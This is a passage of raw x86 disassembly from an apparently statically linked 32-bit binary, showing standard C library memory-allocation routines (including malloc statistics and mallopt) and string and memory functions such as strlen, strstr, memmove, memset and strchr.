pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
mov dword [var_4h], ebx
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08052220
jmp 0x80528b0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, dword [arg_8h]
cmp ebx, 8
mov dword [var_10h], eax
jbe 0x8052a85
cmp ebx, 0xf
mov eax, 0x10
cmovbe ebx, eax
lea eax, [ebx - 1]
test eax, ebx
je 0x8052928
mov eax, 0x10
cmp eax, ebx
jae 0x8052926
lea esi, [esi]
add eax, eax
cmp eax, ebx
jb 0x8052920
mov ebx, eax
cmp edx, 0xffffffdf
ja 0x8052a73
lea eax, [edx + 0xb]
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_14h]
lea eax, [ebx + edx + 0x10]
mov dword [var_14h], edx
mov dword [var_4h], eax
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08051cf0
mov edi, eax
xor eax, eax
test edi, edi
je 0x80529b8
lea eax, [edi - 8]
xor edx, edx
mov dword [var_18h], eax
mov eax, edi
div ebx
test edx, edx
je 0x8052a0e
mov edx, ebx
lea eax, [ebx + edi - 1]
neg edx
and eax, edx
lea esi, [eax - 8]
mov eax, esi
lea edx, [ebx + esi]
sub eax, dword [var_18h]
cmp eax, 0xf
cmovbe esi, edx
mov edx, dword [var_18h]
mov ebx, esi
sub ebx, dword [var_18h]
mov eax, dword [edx + 4]
mov ecx, eax
and ecx, 0xfffffff8
sub ecx, ebx
test al, 2
je 0x80529c0
add ebx, dword [edi - 8]
or ecx, 2
lea eax, [esi + 8]
mov dword [esi + 4], ecx
mov dword [esi], ebx
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
mov edx, ecx
or edx, 5
or eax, 1
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [esi + 4], eax
or dword [ecx + esi + 4], 1
mov eax, dword [edx + 4]
and eax, 7
or eax, ebx
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [edx + 4], eax
mov dword [var_4h], edi
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
mov dword [var_18h], esi
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
test al, 2
jne 0x8052a68
mov edx, eax
mov eax, dword [var_14h]
and edx, 0xfffffff8
add eax, 0x10
cmp edx, eax
jbe 0x8052a68
mov eax, edx
mov ecx, dword [var_18h]
sub eax, dword [var_14h]
add ecx, dword [var_14h]
mov edx, eax
or eax, 5
or edx, 1
cmp dword [var_10h], 0x80aa360
cmovne edx, eax
mov dword [ecx + 4], edx
add ecx, 8
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
and eax, 7
or eax, dword [var_14h]
mov dword [edx + 4], eax
mov dword [var_4h], ecx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
mov eax, dword [var_18h]
add eax, 8
jmp 0x80529b8
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x80529b8
mov dword [arg_ch], edx
add esp, 0x14
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_10h]
mov dword [var_ch], 3
mov dword [var_4h], eax
mov eax, dword [arg_14h]
mov dword [var_10h], eax
lea eax, [var_4h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08052b10
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08052b10
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov ebx, dword [arg_18h]
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_14h], edx
mov edx, dword [arg_14h]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov eax, dword [var_10h]
test byte [eax + 0x28], 1
je 0x8052d21
test ebx, ebx
je 0x8052cd5
mov esi, dword [var_14h]
mov eax, ebx
test esi, esi
je 0x8052c4e
mov dword [var_2ch], ebx
mov dword [var_28h], 0
test byte [var_1ch], 1
je 0x8052c91
mov edx, dword [var_18h]
mov dword [var_20h], 0x10
mov eax, dword [edx]
add eax, 0xb
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
mov eax, dword [var_14h]
cmovb edx, dword [var_20h]
imul eax, edx
mov dword [var_20h], edx
mov dword [var_24h], eax
mov eax, dword [var_24h]
mov edx, dword [var_28h]
mov ebx, dword [0x80aa7f0]
mov dword [0x80aa7f0], 0
lea ecx, [edx + eax - 7]
mov dword [var_4h], ecx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08051cf0
mov dword [0x80aa7f0], ebx
mov edx, eax
xor eax, eax
test edx, edx
je 0x8052c4e
lea ebx, [edx - 8]
mov edi, dword [ebx + 4]
and edi, 0xfffffff8
test byte [var_1ch], 2
jne 0x8052c70
xor eax, eax
mov ecx, dword [var_2ch]
cmp dword [var_10h], 0x80aa360
setne al
test ecx, ecx
lea edx, [eax*4 + 1]
mov dword [var_30h], edx
je 0x8052c56
mov eax, dword [var_14h]
xor esi, esi
dec eax
mov dword [var_34h], eax
cmp esi, dword [var_34h]
mov edx, dword [var_2ch]
lea eax, [ebx + 8]
mov dword [edx + esi*4], eax
je 0x8052c42
mov ecx, dword [var_20h]
test ecx, ecx
jne 0x8052c33
mov edx, dword [var_18h]
mov ecx, 0x10
mov eax, dword [edx + esi*4]
add eax, 0xb
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovae ecx, edx
mov eax, dword [var_30h]
sub edi, ecx
inc esi
or eax, ecx
mov dword [ebx + 4], eax
add ebx, ecx
jmp 0x8052c05
or dword [var_30h], edi
mov eax, dword [var_30h]
mov dword [ebx + 4], eax
mov eax, dword [var_2ch]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_24h]
sub edi, dword [var_24h]
or edi, dword [var_30h]
lea eax, [edx + ebx]
lea edx, [eax + 8]
mov dword [eax + 4], edi
mov dword [var_2ch], edx
mov edi, dword [var_24h]
jmp 0x8052bfc
mov eax, edi
sub eax, dword [var_28h]
mov dword [esp], edx
mov dword [var_4h], 0
sub eax, 4
mov dword [var_8h], eax
call fcn.080536f0
jmp 0x8052bdf
xor esi, esi
mov dword [var_20h], 0
mov dword [var_24h], 0
cmp esi, dword [var_14h]
je 0x8052b91
lea esi, [esi]
mov edx, dword [var_18h]
mov eax, dword [edx + esi*4]
add eax, 0xb
cmp eax, 0xf
jbe 0x8052ccf
and eax, 0xfffffff8
add dword [var_24h], eax
inc esi
cmp esi, dword [var_14h]
jne 0x8052cb0
jmp 0x8052b91
add dword [var_24h], 0x10
jmp 0x8052cc4
mov ebx, dword [var_14h]
test ebx, ebx
je 0x8052d08
mov edx, dword [var_14h]
mov dword [var_28h], 0x10
mov dword [var_2ch], 0
lea eax, [edx*4 + 0xb]
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_28h]
mov dword [var_28h], edx
jmp 0x8052b60
mov edx, dword [var_10h]
mov dword [arg_ch], 0
mov dword [arg_8h], edx
add esp, 0x34
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
mov dword [esp], eax
call fcn.08052430
jmp 0x8052b41
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 0x28], 1
je 0x8052d5f
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [0x80aa7f8]
mov dword [var_sp_4h], eax
call fcn.080528e0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08052430
jmp 0x8052d42
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 0x28], 1
je 0x8052daa
mov ecx, dword [0x80aa7f8]
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov edx, ecx
lea eax, [ecx + eax - 1]
mov dword [var_sp_4h], ecx
neg edx
and eax, edx
mov dword [var_8h], eax
call fcn.080528e0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08052430
jmp 0x8052d82
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [esp], 0x80aa360
call fcn.08052430
mov eax, dword [arg_8h]
mov dword [var_4h], 0x80aa360
mov dword [esp], eax
call fcn.08050e70
leave
ret
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
test eax, eax
je 0x8052e1b
lea edx, [eax - 8]
mov eax, dword [edx + 4]
test al, 2
je 0x8052e0c
and eax, 0xfffffff8
sub eax, 8
leave
ret
and eax, 0xfffffff8
test byte [eax + edx + 4], 1
je 0x8052e1b
sub eax, 4
jmp 0x8052e0a
xor eax, eax
jmp 0x8052e0a
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov eax, dword [arg_ch]
mov eax, dword [eax + 0x54]
test eax, eax
mov dword [var_50h], eax
je 0x8052f3a
mov eax, dword [var_50h]
mov esi, 1
mov dword [var_44h], 0
mov dword [var_40h], 0
xor ebx, ebx
mov edi, dword [eax + 4]
and edi, 0xfffffff8
mov eax, dword [arg_ch]
mov edx, dword [eax + ebx*4 + 0x2c]
test edx, edx
je 0x8052e76
mov eax, dword [edx + 4]
inc dword [var_44h]
mov edx, dword [edx + 8]
and eax, 0xfffffff8
add dword [var_40h], eax
test edx, edx
jne 0x8052e63
inc ebx
cmp ebx, 9
jbe 0x8052e58
mov ecx, dword [arg_ch]
add edi, dword [var_40h]
mov ebx, 1
add ecx, 0x5c
lea esi, [esi]
mov edx, dword [ecx + 0xc]
cmp edx, ecx
je 0x8052ea7
mov eax, dword [edx + 4]
inc esi
mov edx, dword [edx + 0xc]
and eax, 0xfffffff8
add edi, eax
cmp edx, ecx
jne 0x8052e97
inc ebx
add ecx, 8
cmp ebx, 0x7f
jbe 0x8052e90
mov edx, dword [var_44h]
mov ebx, dword [arg_ch]
mov dword [var_38h], esi
mov dword [var_1ch], edi
mov ecx, dword [0x80aa7fc]
mov dword [var_34h], edx
mov eax, dword [ebx + 0x470]
mov ebx, dword [0x80aa7ec]
mov dword [var_2ch], ecx
mov edx, eax
mov dword [var_30h], ebx
mov dword [var_54h], ebx
sub edx, edi
mov ebx, dword [var_50h]
mov dword [var_3ch], eax
mov dword [var_20h], edx
mov dword [var_48h], edx
mov edx, dword [var_40h]
mov dword [var_24h], edx
mov edx, dword [ebx + 4]
mov ebx, dword [0x80aa804]
and edx, 0xfffffff8
mov dword [var_4ch], edx
mov edx, dword [arg_8h]
mov dword [edx], eax
mov dword [edx + 0x14], ebx
mov dword [edx + 4], esi
mov eax, dword [var_44h]
mov ebx, dword [var_40h]
mov dword [edx + 0x10], ecx
mov dword [edx + 8], eax
mov dword [edx + 0x18], ebx
mov eax, dword [var_54h]
mov dword [edx + 0xc], eax
mov eax, dword [var_48h]
mov dword [edx + 0x1c], eax
mov eax, edx
mov dword [edx + 0x20], edi
mov ebx, dword [var_4ch]
mov dword [edx + 0x24], ebx
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret 4
mov edx, dword [arg_ch]
mov dword [esp], edx
call fcn.08052430
mov ebx, dword [arg_ch]
mov ebx, dword [ebx + 0x54]
mov dword [var_50h], ebx
jmp 0x8052e3a
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x48
mov eax, dword [0x80a9518]
mov edi, dword [0x80aa7fc]
test eax, eax
mov esi, edi
js 0x805310b
mov edx, dword [0x80a9504]
mov dword [var_40h], 0
mov ebx, 0x80aa360
mov eax, dword [edx + 0x3c]
mov dword [var_44h], eax
or eax, 2
mov dword [edx + 0x3c], eax
lea esi, [esi]
mov edx, 0
test edx, edx
je 0x8053100
mov dword [esp], ebx
call section.
lea eax, [var_3ch]
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08052e20
mov edx, dword [var_40h]
mov eax, dword [0x80a9504]
sub esp, 4
mov dword [var_4h_2], str.Arena__d:_n
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08049b80
mov eax, dword [var_3ch]
mov dword [var_4h_2], str.system_bytes_______10u_n
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.in_use_bytes_______10u_n
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov eax, 0
add esi, dword [var_3ch]
add edi, dword [var_20h]
test eax, eax
je 0x80530f2
mov dword [esp], ebx
call section.
mov ebx, dword [ebx + 0x46c]
cmp ebx, 0x80aa360
je 0x805304c
inc dword [var_40h]
jmp 0x8052fa0
mov eax, dword [0x80a9504]
mov dword [var_4h], 0x14
mov dword [var_4h_2], 1
mov dword [esp], str.Total__incl._mmap_:_n
mov dword [var_ch], eax
call fcn.08075380
mov eax, dword [0x80a9504]
mov dword [var_4h], esi
mov dword [var_4h_2], str.system_bytes_______10u_n
mov dword [esp], eax
call fcn.08049b80
mov eax, dword [0x80a9504]
mov dword [var_4h], edi
mov dword [var_4h_2], str.in_use_bytes_______10u_n
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.max_mmap_regions___10u_n
mov eax, dword [0x80aa7f4]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.max_mmap_bytes_____10lu_n
mov eax, dword [0x80aa800]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov edx, dword [var_44h]
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], edx
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [ebx], 0
jmp 0x8053036
lea esi, [esi]
mov dword [ebx], 1
jmp 0x8052fb5
call fcn.0804f290
jmp 0x8052f7e
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [0x80a9518]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, 1
test eax, eax
js 0x805321d
mov eax, 0
test eax, eax
je 0x805320e
mov dword [esp], 0x80aa360
call section.
mov dword [esp], 0x80aa360
call fcn.08052430
mov eax, dword [arg_8h]
add eax, 5
cmp eax, 6
ja case.0x8053171.0
jmp dword [eax*4 + 0x8092da8]
cmp ebx, 0x50
ja 0x80531da
mov eax, dword [0x80aa388]
and eax, 2
test ebx, ebx
je 0x80531d3
lea edx, [ebx + 0xb]
cmp edx, 0xf
jbe 0x80531cc
and edx, 0xfffffff8
or edx, eax
or edx, 1
mov eax, 0x80aa360
mov dword [eax + 0x28], edx
mov eax, 0
test eax, eax
je 0x80531c0
mov dword [esp], 0x80aa360
call section.
mov eax, esi
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [0x80aa360], 0
jmp 0x80531b6
mov edx, eax
or edx, 0x11
jmp 0x8053199
mov edx, eax
or edx, 9
jmp 0x8053199
xor esi, esi
jmp case.0x8053171.0
mov dword [0x80a951c], ebx
jmp case.0x8053171.0
mov dword [0x80aa7f0], ebx
jmp case.0x8053171.0
cmp ebx, 0x80000
ja 0x80531da
mov dword [0x80aa7e8], ebx
jmp case.0x8053171.0
mov dword [0x80aa7e4], ebx
jmp case.0x8053171.0
mov dword [0x80aa7e0], ebx
jmp case.0x8053171.0
mov dword [0x80aa360], 1
jmp 0x805315a
call fcn.0804f290
jmp 0x8053141
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov ecx, dword [arg_ch]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [0x80a9514]
mov esi, dword [arg_10h]
test cl, 3
jne 0x8053260
mov edx, ecx
shr edx, 2
lea eax, [edx - 1]
test edx, eax
jne 0x8053260
test ecx, ecx
jne 0x805326d
lea esi, [esi]
mov eax, 0x16
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
test ebx, ebx
je 0x8053295
mov eax, dword [arg_4h]
mov dword [var_sp_4h], esi
mov dword [esp], ecx
mov dword [var_sp_8h], eax
call ebx
mov edx, eax
mov eax, 0xc
test edx, edx
je 0x8053265
mov eax, dword [arg_8h]
mov dword [eax], edx
xor eax, eax
jmp 0x8053265
mov dword [var_sp_4h], esi
mov dword [esp], ecx
call fcn.080513d0
jmp 0x8053281
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08054640
mov edx, eax
xor eax, eax
cmp edx, 0xffffffff
cmovne eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov edi, dword [arg_8h]
test edi, edi
js 0x8053327
cmp edi, dword [0x80a2698]
jge 0x8053327
mov eax, dword [edi*4 + 0x80a24a0]
test eax, eax
jne 0x80533dd
mov dword [var_8h], 5
mov dword [var_4h], 0x8092dc4
mov dword [esp], str.libc
call fcn.0805f1f0
mov dword [esp], eax
mov ebx, eax
call fcn.08053400
mov dword [esp], edi
mov dword [var_8h], 0xa
mov esi, eax
mov byte [var_18h], 0
mov dword [var_ch], 0
lea eax, [var_2ch]
mov dword [var_30h], eax
lea eax, [var_18h]
mov dword [var_4h], eax
call fcn.08063c00
mov edx, dword [arg_ch]
cmp dword [arg_10h], esi
mov edi, eax
mov dword [var_4h], ebx
mov eax, dword [arg_10h]
mov dword [esp], edx
cmova eax, esi
mov dword [var_8h], eax
call fcn.08053740
cmp esi, dword [arg_10h]
mov ecx, eax
jae 0x80533c0
sub dword [var_30h], edi
mov edx, dword [arg_10h]
mov dword [var_4h], edi
mov eax, dword [var_30h]
mov dword [esp], ecx
sub edx, esi
add eax, 0x15
cmp eax, edx
cmovae eax, edx
mov dword [var_8h], eax
call fcn.08053770
mov eax, dword [arg_10h]
test eax, eax
je 0x80533d2
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov byte [edx + eax - 1], 0
mov eax, dword [arg_ch]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_8h], 5
mov dword [var_4h], eax
mov dword [esp], str.libc
call fcn.0805f1f0
jmp 0x80533d5
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov ecx, dword [arg_4h]
mov eax, ecx
and ecx, 3
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
inc eax
xor ecx, 3
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
add eax, 1
sub ecx, 1
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
sub eax, 0xf
add eax, 0x10
mov ecx, dword [eax]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053497
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053497
mov ecx, dword [eax + 4]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053494
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053494
mov ecx, dword [eax + 8]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053491
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053491
mov ecx, dword [eax + 0xc]
mov edx, 0xfefefeff
add edx, ecx
jae 0x805348e
xor edx, ecx
or edx, 0xfefefeff
inc edx
je 0x8053430
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x80534aa
inc eax
test ch, ch
je 0x80534aa
inc eax
test ecx, 0xff0000
je 0x80534aa
inc eax
sub eax, dword [arg_4h]
ret
nop
push ebp
mov ebp, esp
push edi
mov edx, dword [arg_8h]
push esi
mov ecx, dword [arg_ch]
push ebx
mov ebx, dword [arg_10h]
mov edi, edx
movzx eax, byte [edx]
inc edx
test al, al
jne 0x80534c1
sub edx, 2
cmp ebx, 3
jbe 0x8053508
mov esi, ebx
shr esi, 2
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
dec esi
jne 0x80534d6
and ebx, 3
test ebx, ebx
je 0x805351e
lea esi, [esi]
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
dec ebx
jne 0x8053510
test al, al
je 0x8053526
mov byte [edx + 1], 0
pop ebx
pop esi
mov eax, edi
pop edi
leave
ret
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
push ebx
mov ebx, dword [arg_10h]
lea edx, [edi - 1]
cmp ebx, 3
jbe 0x805357f
mov esi, ebx
shr esi, 2
lea esi, [esi]
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x80535a7
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x80535a7
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x80535a7
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x80535a7
dec esi
jne 0x8053550
and ebx, 3
je 0x80535a0
movzx eax, byte [ecx]
inc edx
inc ecx
dec ebx
mov byte [edx], al
je 0x80535a0
test al, al
jne 0x8053584
inc edx
dec ebx
mov byte [edx], 0
jne 0x8053592
lea esi, [esi]
pop ebx
pop esi
mov eax, edi
pop edi
leave
ret
mov eax, edx
sub eax, edi
sub ebx, eax
dec ebx
je 0x80535a0
jmp 0x8053592
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov edx, dword [arg_8h]
mov ebx, dword [arg_ch]
movzx ecx, byte [ebx]
test ecx, ecx
je 0x8053640
dec edx
inc edx
movzx eax, byte [edx]
test eax, eax
je 0x8053680
cmp eax, ecx
jne 0x80535d7
movzx edi, byte [ebx + 1]
test edi, edi
je 0x8053640
add ebx, 2
inc edx
movzx eax, byte [edx]
cmp eax, edi
je 0x8053624
lea esi, [esi]
cmp eax, ecx
je 0x805361c
test eax, eax
je 0x8053680
inc edx
movzx eax, byte [edx]
cmp eax, ecx
je 0x805361c
test eax, eax
je 0x8053680
inc edx
movzx eax, byte [edx]
cmp eax, ecx
jne 0x8053604
inc edx
movzx eax, byte [edx]
cmp eax, edi
jne 0x8053600
lea eax, [edx + 1]
mov dword [var_14h], eax
movzx eax, byte [edx + 1]
dec edx
mov dword [var_10h], ebx
movzx esi, byte [ebx]
cmp eax, esi
je 0x8053650
test esi, esi
mov ebx, dword [var_10h]
jne 0x805364a
mov eax, edx
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
inc edx
movzx eax, byte [edx]
jmp 0x8053600
test esi, esi
je 0x8053640
inc dword [var_14h]
inc ebx
mov esi, dword [var_14h]
movzx eax, byte [esi]
movzx esi, byte [ebx]
cmp eax, esi
jne 0x8053639
test esi, esi
je 0x8053640
inc dword [var_14h]
inc ebx
mov esi, dword [var_14h]
movzx eax, byte [esi]
movzx esi, byte [ebx]
cmp eax, esi
je 0x8053650
jmp 0x8053639
lea esi, [esi]
xor eax, eax
jmp 0x8053642
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
mov ecx, dword [arg_10h]
mov edi, dword [arg_8h]
mov edx, esi
mov esi, dword [arg_ch]
mov eax, edi
sub eax, esi
cmp edi, eax
jae 0x80536bd
cld
shr ecx, 1
jae 0x80536ad
movsb byte es:[edi], byte ptr [esi]
shr ecx, 1
jae 0x80536b3
movsw word es:[edi], word ptr [esi]
rep movsd dword es:[edi], dword ptr [esi]
mov esi, edx
mov eax, dword [arg_8h]
pop edi
ret
std
lea edi, [edi + ecx - 1]
lea esi, [esi + ecx - 1]
shr ecx, 1
jae 0x80536cb
movsb byte es:[edi], byte ptr [esi]
sub edi, 1
sub esi, 1
shr ecx, 1
jae 0x80536d7
movsw word es:[edi], word ptr [esi]
sub edi, 2
sub esi, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, edx
mov eax, dword [arg_8h]
cld
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
cld
push edi
mov edx, dword [arg_8h]
mov ecx, dword [arg_10h]
movzx eax, byte [arg_ch]
jecxz 0x805372d
mov edi, edx
and edx, 3
je 0x8053719
jnp 0x805370e
stosb byte es:[edi], al
dec ecx
je 0x805372d
stosb byte es:[edi], al
dec ecx
je 0x805372d
xor edx, 3
je 0x8053719
stosb byte es:[edi], al
dec ecx
mov edx, ecx
shr ecx, 2
and edx, 3
imul eax, eax, 0x1010101
rep stosd dword es:[edi], eax
mov ecx, edx
rep stosb byte es:[edi], al
mov eax, dword [arg_8h]
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov ecx, dword [arg_10h]
mov eax, edi
mov edi, dword [arg_4h]
mov edx, esi
mov esi, dword [arg_8h]
cld
shr ecx, 1
jae 0x8053756
movsb byte es:[edi], byte ptr [esi]
shr ecx, 1
jae 0x805375c
movsw word es:[edi], word ptr [esi]
rep movsd dword es:[edi], dword ptr [esi]
xchg edi, eax
mov esi, edx
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov ecx, dword [arg_ch]
mov eax, edi
mov edi, dword [arg_4h]
mov edx, esi
mov esi, dword [arg_8h]
cld
shr ecx, 1
jae 0x8053786
movsb byte es:[edi], byte ptr [esi]
shr ecx, 1
jae 0x805378c
movsw word es:[edi], word ptr [esi]
rep movsd dword es:[edi], dword ptr [esi]
mov edi, eax
mov esi, edx
mov eax, dword [arg_4h]
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x80537e0
cmp byte [eax], dl
je 0x8053864
inc eax
test al, 3
je 0x80537e0
cmp byte [eax], dl
je 0x8053864
inc eax
test al, 3
je 0x80537e0
cmp byte [eax], dl
je 0x8053864
inc eax
lea esi, [esi]
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x8053851
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8053851
mov ecx, dword [eax + 4]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x805384e
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x805384e
mov ecx, dword [eax + 8]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x805384b
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x805384b
mov ecx, dword [eax + 0xc]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x8053848
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8053848
add eax, 0x10
jmp 0x80537e0
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x8053864
inc eax
test ch, ch
je 0x8053864
inc eax
test ecx, 0xff0000
je 0x8053864
inc eax
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x80538d3
mov cl, byte [eax]
cmp dl, cl
je 0x80539cd
test cl, cl
je 0x80539cd
inc eax
test al, 3
je 0x80538d3
mov cl, byte [eax]
cmp dl, cl
je 0x80539cd
test cl, cl
je 0x80539cd
inc eax
test al, 3
je 0x80538d3
mov cl, byte [eax]
cmp dl, cl
je 0x80539cd
test cl, cl
je 0x80539cd
inc eax
jmp 0x80538d3
lea esi, [esi]
add eax, 0x10
mov ecx, dword [eax]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539af
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539af
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539af
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539af
mov ecx, dword [eax + 4]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539ac
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539ac
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x80539ac
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80539ac
mov ecx, dword [eax + 8]
xor ecx, edx
mov edi, 0xfefefeff
